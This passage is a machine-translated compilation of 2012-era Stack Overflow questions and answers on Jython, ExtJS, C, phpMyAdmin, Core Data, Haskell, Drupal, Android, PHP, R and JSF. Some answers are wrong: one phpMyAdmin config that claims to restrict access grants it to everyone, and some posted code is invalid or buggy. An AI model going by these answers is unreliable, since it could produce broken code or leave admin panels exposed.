由于我是摇摆新手，因此我尝试从[http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#editor](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#editor)翻译示例。但是，如果我实现它，它只会“起作用”（如运行但没有按预期运行，我永远看不到组合框）`TableCellEditor`，但根据示例：

> AbstractCellEditor 类是一个很好的超类。它实现了 TableCellEditor 的超级接口 CellEditor，省去了实现单元格编辑器所需的事件触发代码的麻烦。

因此，我想实现`AbstractCellEditor`，但是这样做会产生：

> 类型错误：无法将 org.python.proxies.cross.gui.ipTable$customCombo$2@3da850 转换为 javax.swing.table.TableCellEditor

作为一个有益的问题：我如何使生产线`self._box.actionListener = self.actionPerformed`工作？我发现[使用 Jython & Swing 进行事件处理](https://stackoverflow.com/questions/520615/event-handling-with-jython-swing)，但是我不确定如何将其转移到我的案例中，特别是因为我不想将父（表）绑定到 customCombo

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T08:44:39.573

多重继承是关键：

```
class customCombo(TableCellEditor, AbstractCellEditor): 
```

# plugins - ExtJS 4.0.7：树形网格 - 多个插件

> ID：10811639
> 
> 赞同：0
> 
> 时间：2012-05-30T07:16:12.300
> 
> 标签：plugins, extjs, extjs4, treegrid

在过去的一周里，我试图找到一个解决方案，但没有运气。所以这是我最后的选择。

我在 ExtJS 4.0.7 中有一个树形网格。（我可以选择更新到 4.1.0，但它会产生一些我没有时间查看的错误）。我希望能够拖放以及编辑树网格中的指定单元格。但到目前为止，我一直无法将两个或多个插件添加到一个网格中。

```
viewConfig: {
    id: 'raGridTreeView',
    plugins: [
        Ext.create('Ext.tree.plugin.TreeViewDragDrop', { ptype: 'treeviewdragdrop', appendOnly: true })
        // Second plugin here: Ext.grid.plugin.CellEditing (This does not exist in tree plugins)
    ]
}, 
```

有人知道如何解决这个问题吗？也许是一种解决方法/覆盖？

更新：我之前一直在尝试，我已经添加了代码：

```
Ext.override(Ext.data.AbstractStore,{ 
   indexOf: Ext.emptyFn 
}); 
```

在项目开始时。我不知道它是否有效，但我想不会，因为它对结果没有影响。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-04T13:19:17.053

没关系，想通了：这一切都与我调用插件的方式有关：

而不是使用

```
plugins: [
    Ext.create('Ext.tree.plugin.TreeViewDragDrop', { ptype: 'treeviewdragdrop', appendOnly: true })
    // Second plugin here: Ext.grid.plugin.CellEditing (This does not exist in tree plugins)
] 
```

我应该使用：

```
plugins: [{ 
    Ext.create('Ext.tree.plugin.TreeViewDragDrop', { ptype: 'treeviewdragdrop', appendOnly: true })
},{
    // Second plugin here
}] 
```

# c++ - 使用系统命令从 Windows 下的 ac 程序内部更改目录

> ID：10811645
> 
> 赞同：8
> 
> 时间：2012-05-30T07:16:35.977
> 
> 标签：c++, c, windows, system

我有一个问题，我必须从 C 程序内部运行命令提示符命令。这是我所做的

```
#include<stdio.h>
#include<stdlib.h>

int main(){

system("cd \Users");
system("Dir");

} 
```

问题是我想先 cd 进入用户，然后执行命令 Dir，因为目前程序输出它找不到指定的路径，并且 Dir 在父进程目录中执行，即程序源文件所在的位置。

我想要做的实际任务只是想从 C 程序内部的特定目录运行 java 文件。该 java 文件位于 C:\Users\Abdullah\pro 中。我的 C 程序的父目录是 C:\Users\Cprog。请告知我该怎么做

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-30T07:18:05.243

`system()`开始一个新的过程。这个新进程会更改*其*当前目录，然后结束。程序进程的当前目录不会改变。

你想要`chdir()`（或`_chdir()`）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-30T07:42:36.447

您的程序有一些不正确的假设。首先，“cd”和“dir”不是程序，而是shell内置的命令，cmd.exe。其次，我怀疑您根本不需要更改当前目录。

无论哪种方式，由于这是一个 Windows 系统，我将[看一个有关如何使用 CreateProcess() 启动程序的示例](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682512%28v=vs.85%29.aspx)。

要更改当前目录，请查看 CreateProcess() 调用的[lpCurrentDirectory 参数](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425%28v=vs.85%29.aspx)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-30T07:23:23.417

仅对于 Windows，还有这个[SetCurrentDirectory()](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365530%28v=vs.85%29.aspx)函数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:55:26.690

' **cd** ' 不是您尝试执行的单独可执行文件。通常，'cd' 是 shell/command 的内置命令。您不能使用 'system()' 执行 'cd' 并期望使其在您的程序中相应地工作。如果您希望在程序中执行目录更改，则必须使用“chdir()”函数（或系统调用）。请参阅“chdir()”的手册页。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-04-28T20:16:18.267

这应该有效：

```
system("dir Users\\whatEverNextFolder > test.txt"); 
```

# phpmyadmin - 如何禁用远程登录到 phpmyadmin

> ID：10811648
> 
> 赞同：6
> 
> 时间：2012-05-30T07:16:51.717
> 
> 标签：phpmyadmin, remote-access

标题几乎概括了我的问题。我只想了解如何禁用远程登录到我的 phpmyadmin。我宁愿只能从 localhost 登录到 phpmyadmin。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-30T07:20:28.220

编辑`/etc/phpmyadmin/apache.conf`：

```
 Order Allow,Deny
    Allow from localhost 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-04-12T06:26:13.753

**如果您没有在 /etc/phpmyadmin/apache.conf 中**停止远程登录，则阻止远程登录不会停止对 phpmyadmin 的访问****

 ****要使用 apache** Web 服务器在 ubuntu 14.04 中关闭对 phpmyadmin 的访问，请**编辑 /etc/phpmyadmin/apache.conf**

搜索`<Directory /phpmyadmin>`或`<Directory /usr/share/phpmyadmin>`是否在同一文件中设置别名 /phpmyadmin /usr/share/phpmyadmin。

**添加或编辑以下行**：

```
Order Deny,Allow
Deny from all 
```

**使用 sudo service apache2 restart 重启**apache2****

 **要暂时打开对 phpmyadmin 的访问，首先要找出您的 IP 地址。搜索谷歌，我的IP地址是什么。然后编辑 vi /etc/phpmyadmin/apache.conf 文件。将此行添加到上述目录标记中： `Allow from <your ip address>`

使用 sudo service apache2 restart 重启 apache2

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-01-09T08:48:07.860

在 Centos 和 RHEL 上，它保存在这里：`/etc/httpd/conf.d`

编辑添加目录并拒绝或允许。

```
<Directory /usr/share/phpMyAdmin/>
   AddDefaultCharset UTF-8

   <IfModule mod_authz_core.c>
     # Apache 2.4
     <RequireAny>
Require all granted
 Require ip 127.0.0.1
       Require ip ::1
     </RequireAny>
   </IfModule>
   <IfModule !mod_authz_core.c>
     # Apache 2.2
     Order Deny,Allow
     Allow from All
     Allow from 127.0.0.1
     Allow from ::1
   </IfModule>
</Directory> 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2017-06-03T12:46:01.277

搜索目录 /phpmyadmin 或目录 /usr/share/phpmyadmin

在目录/目录之间插入需要本地****

# ios - 使用 NSThread 和核心数据出现问题，更改未正确写入

> ID：10811649
> 
> 赞同：0
> 
> 时间：2012-05-30T07:16:54.870
> 
> 标签：ios, core-data

我遇到了一个问题，我只是想不出解决方案。

我的应用程序配置为使用 Core Data（使用 xCode 创建的 AppDelegate 中的模板代码），在后台线程中导入大量数据。问题是，如果我运行了大型导入，我在 UI 线程中对 Core Data 所做的所有更改都不会保存到存储（有时）。如果我不运行导入，所有数据都会正确保存，并且问题不一致，这是一个开/关问题，但我已将其追踪为导致问题的导入。

我的线程代码看起来像这样（简化）

```
-(void)startSynchronization{
self.thread = [[NSThread alloc] initWithTarget:self selector:@selector(startSync:) object:nil];
[self.thread start];
}

-(void)startSync{
NSManagedObjectContext *importContext = [[NSManagedObjectContext alloc] init];  
[importContext setPersistentStoreCoordinator:self.persistentStoreCoordinator];
[importContext setUndoManager:nil];
... import a lot of code and create thousands of core data entities..

} 
```

persistentStoreCoordinator（从现在开始的 PSC）是来自应用程序 AppDelegate 的 PSC，我认为这就是问题所在。我读到多个线程应该使用单独的 PSC，但是我如何创建一个 PSC 并将其分配给在 AppDelegate 模板代码中创建的核心数据文件？

导入后核心数据的读取工作正常，但是当我稍后将核心数据模型中的一个“文档”实体标记为我的最爱时，即使我调用保存，此更改也不会写入数据库我来自 AppDelegate 的上下文。

我以为全局 PSC 用于同步多个上下文，我的应用程序中的一个上下文，以及线程导入代码中的导入上下文？

如何确保导入代码和 UI 代码看到相同的更改，并且我的商店是一致的？

谢谢

/雅各布

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T08:06:46.243

他们改进了多线程在 iOS 5/MacOS 10.7 中的工作方式。现在，多线程 Core Data 有三种模式`NSConfinementConcurrencyType`：`NSPrivateQueueConcurrencyType`和`NSMainQueueConcurrencyType`. 第一个是过去的工作方式，也是您正在使用的方式。我提到其他的，因为它们可能值得研究，并且因为术语在搜索时可能很有用。

对于线程限制方法，您可以为每个线程创建一个新的托管对象上下文，就像您正在做的那样。我认为在你的循环之后你正在调用`save`背景上下文。您缺少的步骤是响应`NSManagedObjectContextDidSaveNotification`. 来自苹果的[文档](http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/coredata/Articles/cdConcurrency.html#//apple_ref/doc/uid/TP40003385-SW1)：

> 通常，在线程 A 上，您注册托管对象上下文保存通知，`NSManagedObjectContextDidSaveNotification`. 当您收到通知时，其用户信息字典包含在线程 B 上插入、删除和更新的托管对象的数组。但是，由于托管对象与不同的线程相关联，因此您不应直接访问它们。相反，您将通知作为参数传递给`mergeChangesFromContextDidSaveNotification:`（您将其发送到线程 A 上的上下文）。使用此方法，上下文能够安全地合并更改。

总而言之，您所做的是订阅该通知，当它发生时（并且您的选择器被调用），您只需调用`mergeChangesFromContextDidSaveNotification:`主线程的托管对象上下文，将通知对象传递给后一种方法，如下所示：

```
- (void)mergeChanges:(NSNotification *)notification 
{
    if (notification.object != self.context) {
        [self.context mergeChangesFromContextDidSaveNotification:notification];
    }

    return;
} 
```

假设您已经订阅了通知，这`self.context`指的是您的主线程的托管对象上下文。那应该处理获取更新。

我在上面提到其他并发类型的原因是另一种进行并发的方法（如果您使用的是最新的操作系统）涉及父上下文和子上下文。您可以有一个在私有队列模式下运行的上下文，并将其父级设置为您的主要 MOC。当上下文有父上下文时，对子上下文的保存操作只是将其更改推送到父上下文，而不接触磁盘。这可能是您可以研究的另一种模式。

# ipad - 从 iPad 播放时动态转换 Flash 内容

> ID：10811652
> 
> 赞同：0
> 
> 时间：2012-05-30T07:17:00.937
> 
> 标签：ipad, video, video-streaming, html5-video, video-encoding

我有一个使用 Flash 播放器流式传输视频的网站。我想从 iPad 上提供网站内容。

大多数视频文件都是 Flash 格式。据我了解，iPad 不支持 Flash，可以使用 html5-video 作为替代方案。但为此，服务器上的所有当前 Flash 视频都必须转换为 mp4 格式。

从 iPad 上拍摄的这些视频是否可以动态转换为另一种格式？

或者，我是否必须将所有视频转换为另一种格式，如 mp4 并再次为 iPad 上传？

或者，有没有办法使用 Flash 视频本身在 iPad 中流式传输？

我正在寻找一种解决方法。

# linux - Linux 进程间共享类对象

> ID：10811656
> 
> 赞同：0
> 
> 时间：2012-05-30T07:17:28.460
> 
> 标签：linux, class, shared

是否可以在公共内存中共享 Class 对象？

我必须在两个进程之间共享类的对象。

约翰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:36:59.647

是的，有可能做到这一点。

[使用shmget(2)](http://linux.die.net/man/2/shmget)查看共享内存。

不过要非常小心：永远不要尝试对具有虚拟方法的类执行此操作。vtable 指针会导致问题。vtable 指针指向一个函数指针表，一个类的每个虚方法。不能保证这些指针对于两个进程都是正确的，这意味着如果错误的进程试图调用其中一个方法，它将取消引用无效指针。

# haskell - 为什么 Haskell 中不允许同时定义所有类型的函数？

> ID：10811657
> 
> 赞同：23
> 
> 时间：2012-05-30T07:17:35.020
> 
> 标签：haskell, type-systems

这可能是一个非常基本的问题，但是......

一个定义为的函数，比如说

```
foo :: a -> Integer 
```

表示从*任何*类型到整数的函数。如果是这样，那么理论上应该能够为任何类型定义它，就像这样

```
foo 1 = 10
foo 5.3 = 100
foo (x:xs) = -1
foo  _     = 0 
```

但是 Haskell 只允许一个通用的定义，比如`foo a = 0`.

即使您限制`a`为某一类类型之一，例如 Show typeclass 的实例：

```
foo :: (Show a) => a -> Integer 
```

你仍然不能做类似的事情

```
foo "hello" = 10
foo   _     = 0 
```

即使`"hello" :: [Char]`是一个实例`Show`

为什么会有这样的限制？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-05-30T09:52:27.637

这是一个特性，实际上是非常基本的。它归结为编程语言理论中称为*参数的属性。*粗略地说，这意味着评估永远不应该依赖于编译时变量的类型。您不能静态地查看不知道其具体类型的值。

为什么这么好？它提供了关于程序的更强的不变量。例如，您仅从类型就知道`a -> a`必须是恒等函数（或发散）。类似的“自由定理”适用于许多其他多态函数。参数化也是更高级的基于类型的抽象技术的基础。例如，`ST s a`Haskell 中的类型（状态单子），以及相应`runST`函数的类型，都依赖于`s`参数化。这确保了正在运行的函数不会弄乱状态的内部表示。

这对于有效实施也很重要。程序不必在运行时传递昂贵的类型信息（*类型擦除*），编译器可以为不同的类型选择重叠的表示。作为后者的一个例子，0 和 False 以及 () 和 [] 在运行时都用 0 表示。如果允许像您这样的功能，这是不可能的。

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2012-05-30T07:36:45.200

Haskell 喜欢一种称为“类型擦除”的实现策略：类型没有计算意义，因此您发出的代码不需要跟踪它们。这对性能来说是一个重大的好处。

你为这种性能优势付出的代价是类型没有计算意义：一个函数不能根据它传递的参数的类型来改变它的行为。如果你允许类似的东西

```
f () = "foo"
f [] = "bar" 
```

那么该属性将不成立： 的行为`f`确实取决于其第一个参数的类型。

肯定有语言允许这种事情，特别是在依赖类型的语言中，类型通常无论如何都不能被删除。

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2012-05-30T08:05:16.980

对于一个函数`a -> Integer`，只有一种行为是允许的——返回一个常量整数。为什么？因为你不知道什么是类型`a`。在没有指定约束的情况下，它绝对可以是任何东西，并且因为 Haskell 是静态类型的，所以您需要在编译时解决与类型有关的所有问题。在运行时，类型信息不再存在，因此无法查询 - 所有要使用的函数的选择都已做出。

最接近 Haskell 允许这种行为的是类型类的使用——如果你创建了一个`Foo`用一个函数调用的类型类：

```
class Foo a where
    foo :: a -> Integer 
```

然后你可以为不同类型定义它的实例

```
instance Foo [a] where
    foo [] = 0
    foo (x:xs) = 1 + foo xs

instance Foo Float where
    foo 5.2 = 10
    foo _ = 100 
```

那么只要你能保证某个参数`x`是一个`Foo`你就可以调用`foo`它。不过你仍然需要它——你不能再写一个函数

```
bar :: a -> Integer
bar x = 1 + foo x 
```

因为编译器不知道这`a`是`Foo`. 您必须告诉它，或者省略类型签名并让它自己弄清楚。

```
bar :: Foo a => a -> Integer
bar x = 1 + foo x 
```

Haskell 只能使用编译器所拥有的关于某事物类型的尽可能多的信息进行操作。这听起来可能有限制，但实际上类型类和参数多态性是如此强大，我从不错过动态类型。事实上，我通常觉得动态类型很烦人，因为我从来不完全确定任何东西到底是什么。

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2012-05-30T18:52:47.507

正如您所描述的那样，该类型`a -> Integer`并不真正意味着“*任何*类型的函数”。`Integer`当定义或表达式具有类型`a -> Integer`时，这意味着对于任何类型`T`，都可以将此定义或表达式特化或实例化为**类型**的**函数**`T -> Integer`。

稍微切换符号，一种思考方式是它`foo :: forall a. a -> Integer`实际上是*两个*参数的函数：一个类型`a`和该类型的值`a`。或者，就柯里化而言，`foo :: forall a. a -> Integer`它是一个将类型`T`作为参数的函数，并为此生成一个特殊类型`T -> Integer`的函数`T`。以恒等函数为例（产生其参数作为结果的函数），我们可以如下演示：

```
-- | The polymorphic identity function (not valid Haskell!)
id :: forall a. a -> a
id = \t -> \(x :: t) -> x 
```

这种将多态性实现为多态函数的类型参数的想法来自一个名为[System F](http://en.wikipedia.org/wiki/System_F)的数学框架，Haskell 实际上将其用作其理论来源之一。然而，Haskell 完全隐藏了将类型参数作为参数传递给函数的想法。

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2012-05-30T09:55:25.270

这个问题是基于一个错误的前提，Haskell 可以做到！（虽然它通常只在非常特殊的情况下使用）

```
{-# LANGUAGE ScopedTypeVariables, NoMonomorphismRestriction #-}

import Data.Generics

q1 :: Typeable a => a -> Int
q1 = mkQ 0 (\s -> if s == "aString" then 100 else 0)

q2 :: Typeable a => a -> Int
q2 = extQ q1 (\(f :: Float) -> round f) 
```

加载并进行试验：

```
Prelude Data.Generics> q2 "foo"
0
Prelude Data.Generics> q2 "aString"
100
Prelude Data.Generics> q2 (10.1 :: Float)
10 
```

这不一定与声称类型没有计算意义的答案相冲突。这是因为这些示例需要`Typeable`约束，它将类型具体化为在运行时可访问的数据值。

大多数所谓的泛型函数（例如 SYB）依赖于一个`Typeable`或一个`Data`约束。一些软件包引入了它们自己的替代功能，以达到基本相同的目的。如果没有类似这些类的东西，就不可能做到这一点。

# image - 如何在 Drupal 7 中调整图像大小？

> ID：10811660
> 
> 赞同：0
> 
> 时间：2012-05-30T07:17:48.180
> 
> 标签：image, drupal-7

我正在研究 Drupal 7。

Drupal 7 具有内置函数 image_load() 和 image_resize()。但它没有调整图像大小。虽然它没有源文件夹和目标文件夹路径。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T14:53:09.090

尝试使用[theme_image_formatter](http://api.drupal.org/api/drupal/modules!image!image.field.inc/function/theme_image_formatter/7) () ？！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T10:10:41.250

你必须使用

```
image_save(stdClass $image, $destination = NULL) after image_resize(). 
```

请参阅[Drupal API](http://api.drupal.org/api/drupal/includes%21image.inc/function/image_save/7)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-29T08:57:44.723

```
function mymodulename_file_presave ($file) {

    if($file->type=='image')
    {
       $image_file = $file->uri;
       $image_name= $file->filename;
       $file_full_url= file_create_url($image_file); 
       $url = $image_file;
       $destination_folder =$image_file;
       $newfname =  $destination_folder;

        if($file->filemime=='image/jpeg')
        {
            $file = fopen ($url, "rb");
            if ($file) 
            {
                $filename=$newfname;
                $img = imagecreatefromjpeg($filename);
                header("Content-Type: image/jpeg");
                imagejpeg($img, $filename, 50);
            }
            if ($file) 
            {
                fclose($file);
            }
        }
        else if($file->filemime=='image/png')
        {
             $file = fopen ($url, "rb");
            if ($file) 
            {
                $filename=$newfname;
                $img = imagecreatefrompng($filename);
                header("Content-Type: image/jpeg");
                imagejpeg($img, $filename, 50);
            }
            if ($file) 
            {
                fclose($file);
            }
        }
        else if($file->filemime=='image/gif')
        {
            $file = fopen ($url, "rb");
            if ($file) 
            {
                $filename=$newfname;
                $img = imagecreatefrompng($filename);
                header("Content-Type: image/jpeg");
                imagejpeg($img, $filename, 50);
            }
            if ($file) 
            {
                fclose($file);
            }
        }
    } 
```

# android - 如何从任何屏幕完全退出应用程序

> ID：10811663
> 
> 赞同：-3
> 
> 时间：2012-05-30T07:17:59.677
> 
> 标签：android, exit, activity-finish

我想从我也尝试过的任何屏幕上完全退出 android 应用程序`System.exit(0);`，`finish();`但它只退出我想完全退出的当前活动。我使用菜单选项退出，任何人都可以帮助我编码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:26:02.473

按下**主页按钮**！你完成了！

您无需真正考虑退出应用程序（假设您要求退出按钮）。这不是 Android 应用程序通常的工作方式。

请阅读此链接以获取更多信息：[何时在 Android 应用程序中包含退出按钮（提示：从不）](http://blog.radioactiveyak.com/2010/05/when-to-include-exit-button-in-android.html)

[这个](https://stackoverflow.com/q/2033914/977676)问题也可能会有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-31T07:47:32.320

在程序的编码中使用它

`android.os.Process.killProcess(android.os.Process.myPid());`

这会杀死你的进程

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:22:57.220

**ActivityManager.killBackgroundProcesses(PackageName)**会有所帮助。

[http://developer.android.com/reference/android/app/ActivityManager.html#killBackgroundProcesses%28java.lang.String%29](http://developer.android.com/reference/android/app/ActivityManager.html#killBackgroundProcesses%28java.lang.String%29)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-05-30T07:22:10.043

当你开始一个活动时，使用 startActivityForResult()。

```
Intent intent = new Intent(MainActivity.this, NewActivity.class);
startActivityForResult(intent, ActivitiesRequests.REQUEST_FROM_NEW_ACTIVITY); 
```

然后，如果一个活动也想通知其调用者退出，它可以使用结果代码：setResult(RESULT_CANCELED);。然后在 MainActivity 中捕获它：

```
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data)
{
    switch (requestCode)
    {
    case ActivitiesRequests.REQUEST_FROM_NEW_ACTIVITY:
        if (resultCode == RESULT_CANCELED)
            finish();
        break;
    }
    super.onActivityResult(requestCode, resultCode, data);
} 
```

# php - 输出后的http头重定向

> ID：10811668
> 
> 赞同：0
> 
> 时间：2012-05-30T07:18:17.273
> 
> 标签：php, http, internet-explorer-9, opera

在我目前的项目上工作时，我发现了一点好奇心。如果我尝试在任何输出之后重定向 url，它仍然可以正常工作。但根据php手册它不应该工作。

```
error_reporting(-1);
echo "test";
header("Location: http://www.google.com/"); 
```

将我重定向到谷歌没有任何错误。那有什么问题（我的 apache 配置？不知道......）。它也适用于 cookie 等。

我正在使用 IE9（也用 Opera 测试过）和 Apache/2.2.21。

问候亚历克斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T07:54:57.777

感谢 Will & pieman 的帖子，它发现有一个 std 输出缓冲区，我无法禁用或偏置。为了解决这个“问题”，我放置了一个

```
ob_end_clean(); 
```

在我的 index.php 的第一行中声明。导致我的原始测试代码失败（我期望的）。这确实不好，但很有必要。如果你们中的任何人都可以提供“更好”的解决方案，我将不胜感激。

问候亚历克斯

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-31T06:34:34.910

根据 Will 和 Ganesh 的评论，您还可以尝试[`ob_get_status()`](http://www.php.net/manual/en/function.ob-get-status.php)查看在`echo`调用时是否打开了任何输出缓冲区。如果你这样做了，那么你`echo`将被转储到缓冲区中，并且不会立即发送给客户端。然后`header()`仍然可以正确调用，因为没有发送任何内容。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-30T07:28:45.737

由于 PHP INI 设置，您的数据在输出之前会被缓冲。这就是为什么它成功重定向到下一页

# r - R rgl 轴刻度和刻度标签之间的距离

> ID：10811669
> 
> 赞同：5
> 
> 时间：2012-05-30T07:18:22.183
> 
> 标签：r, rgl

我正在使用 plot3d() 绘制一些点数据。我想让我的 y 轴刻度标签更靠近我的 y 轴刻度线。

我能想到的最好方法是

1）先绘制数据，不画轴

2）调用axis3d（）绘制y轴和刻度线，但禁止绘制标签。

3）查询每个刻度线在3D空间中的当前位置。将位置存储在向量中。

4) 使用 mtext3d() 根据对向量的调整在位置添加标签

我在第 3 步遇到问题。我不知道如何查询每个刻度线的位置。par3d() 允许您查询许多图形参数，有没有类似的东西可以用来获取每个 y 轴刻度的位置？

我接近这个错误吗？大概。

这是一段示例代码，没有为 y 轴标签添加文本....

```
require(rgl)
x <- rnorm(5)
y <- rnorm(5)
z <- rnorm(5)
open3d()
plot3d(x,y,z,axes=F,xlab="",ylab="",zlab="")
par3d(ignoreExtent=TRUE)
par3d(FOV=0)
par3d(userMatrix=rotationMatrix(0,1,0,0))
axis3d('y',nticks=5,labels = FALSE)
par3d(zoom=1)
par3d(windowRect=c(580,60,1380,900)) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-23T13:13:53.643

一种方法是在绘制轴之前明确定义刻度位置，而不是在绘制轴之后查询它们。然后您可以使用`line=`选项`mtext3d`来控制刻度标签与轴的距离，如下所示：

```
require(rgl)
rgl.close()
x <- rnorm(5)
y <- rnorm(5)
z <- rnorm(5)
open3d()
plot3d(x,y,z,axes=F,xlab="",ylab="",zlab="")
par3d(ignoreExtent=TRUE)
par3d(FOV=0)
par3d(userMatrix=rotationMatrix(0,1,0,0))
par3d(zoom=1)
par3d(windowRect=c(580,60,1380,900))

# and here is the trick:
my.ticks <- pretty(y, n=5)
axis3d('y', at=my.ticks, labels=rep("", 5))
mtext3d(paste(my.ticks), at=my.ticks, edge='y', line=.6) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-09-02T19:47:21.973

我发现在axis3d中控制标签位置和刻度长度的最简单方法是用几个额外的参数重写函数`ticksize`并`lab_dist`添加可用于覆盖函数中嵌入的默认值。的默认值`ticksize = 0.05`，并 `lab_dist = 3`重现原来的行为`axis3d`。

要获得更小的刻度和更接近的标签，您可以使用例如调用它

```
axis3('y', nticks=5, labels = FALSE, ticksize = 0.03, lab_dist = 2) 
```

新函数如下所示：

```
axis3 <- function (edge, at = NULL, labels = TRUE, tick = TRUE, line = 0, 
          pos = NULL, nticks = 5, ticksize = 0.05, lab_dist = 3, ...) 
{
  save <- par3d(skipRedraw = TRUE, ignoreExtent = TRUE)
  on.exit(par3d(save))
  ranges <- rgl:::.getRanges()
  edge <- c(strsplit(edge, "")[[1]], "-", "-")[1:3]
  coord <- match(toupper(edge[1]), c("X", "Y", "Z"))
  if (coord == 2) 
    edge[1] <- edge[2]
  else if (coord == 3) 
    edge[1:2] <- edge[2:3]
  range <- ranges[[coord]]
  if (is.null(at)) {
    at <- pretty(range, nticks)
    at <- at[at >= range[1] & at <= range[2]]
  }
  if (is.logical(labels)) {
    if (labels) 
      labels <- format(at)
    else labels <- NA
  }
  mpos <- matrix(NA, 3, length(at))
  if (edge[1] == "+") 
    mpos[1, ] <- ranges$x[2]
  else mpos[1, ] <- ranges$x[1]
  if (edge[2] == "+") 
    mpos[2, ] <- ranges$y[2]
  else mpos[2, ] <- ranges$y[1]
  if (edge[3] == "+") 
    mpos[3, ] <- ranges$z[2]
  else mpos[3, ] <- ranges$z[1]
  ticksize <- ticksize * (mpos[, 1] - c(mean(ranges$x), mean(ranges$y), 
                                    mean(ranges$z)))
  ticksize[coord] <- 0
  if (!is.null(pos)) 
    mpos <- matrix(pos, 3, length(at))
  mpos[coord, ] <- at
  x <- c(mpos[1, 1], mpos[1, length(at)])
  y <- c(mpos[2, 1], mpos[2, length(at)])
  z <- c(mpos[3, 1], mpos[3, length(at)])
  if (tick) {
    x <- c(x, as.double(rbind(mpos[1, ], mpos[1, ] + ticksize[1])))
    y <- c(y, as.double(rbind(mpos[2, ], mpos[2, ] + ticksize[2])))
    z <- c(z, as.double(rbind(mpos[3, ], mpos[3, ] + ticksize[3])))
  }
  result <- c(ticks = segments3d(x, y, z, ...))
  if (!all(is.na(labels))) 
    result <- c(result, labels = text3d(mpos[1, ] + lab_dist * ticksize[1], 
                                        mpos[2, ] + lab_dist * ticksize[2], 
                                        mpos[3, ] + lab_dist * ticksize[3], 
                                        labels, ...))
  lowlevel(result)
} 
```

# java - JSF 2.0：空运算符不适用于参数

> ID：10811671
> 
> 赞同：5
> 
> 时间：2012-05-30T07:18:23.980
> 
> 标签：java, jsf-2, el, param

在文件`aPage.xhtml`中，我有以下几行：

```
<ui:include rendered="#{not empty param.target}" src="#{param.target}.html" />
<ui:include rendered="#{empty param.target}" src="About.html" /> 
```

通过以上几行，我希望当我转到 时`http://localhost:8080/beta/aPage.xhtml`，该页面`About.html`将被包含在内，因为`param.target`is `null`。但是，GlassFish 向我抛出了以下异常：

```
java.io.FileNotFoundException: http://localhost:8080/beta/.html 
```

不知何故，`param.target`不被认为是`null`。

此外，我确实尝试使用`==`和`!=`运算符如下：

```
<ui:include rendered="#{param.target != null}" src="#{param.target}.html" />
<ui:include rendered="#{param.target == null}" src="About.html" /> 
```

有趣的是，这一次，在 GlassFish 的控制台上，我没有看到任何异常抛出。但是，在浏览器上，仍然会出现错误页面，但出现异常`java.io.FileNotFoundException`。

如果您能告诉我为什么会发生这种情况以及我应该做些什么来避免它，我将不胜感激。

**更新：**

感谢 Joop Eggen 的提示，我终于用以下几行解决了这个问题：

```
<ui:param name="noTarget"  value="About.html" />
<ui:param name="hasTarget" value="#{param.target}.html" />
<ui:include src="#{empty param.target? noTarget : hasTarget}" /> 
```

最好的祝福

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:55:38.017

src 在这两种情况下都会被评估，也许是文件存在测试？做

```
<ui:include src="#{empty param.target? 'About' : param.target}.html" /> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T07:45:51.177

`ui:include`没有`rendered`属性...用`<h:panelGroup`

像这样

```
<h:panelGroup rendered="#{not empty param.target}">
   <ui:include  src="#{param.target}.html" />
</h:panelGroup>
<h:panelGroup rendered="#{empty param.target}" >
    <ui:include src="About.html" />
</h:panelGroup> 
```

**编辑**

不幸的是，这仅在点的 src 中的 EL 有效路径时才有效，

原因

> src of 中的 EL 在`<ui:include>`视图构建期间评估，而不是在视图渲染期间评估

# php - 从包含多个键的字符串中提取键

> ID：10811672
> 
> 赞同：0
> 
> 时间：2012-05-30T07:18:26.383
> 
> 标签：php

我正在寻找一种轻松提取包含多个键的字符串的方法。该字符串是 curl 标头响应的结果

```
echo $response['body'];
// status=2 reason=Invalid tariff/currency 
```

期望的结果：

```
$status == '2';
$reason == 'Invalid tariff/currency'; 
```

或者

```
array (
    [status] => '2'
    [reason] => 'Invalid tariff/currency'
) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:27:47.963

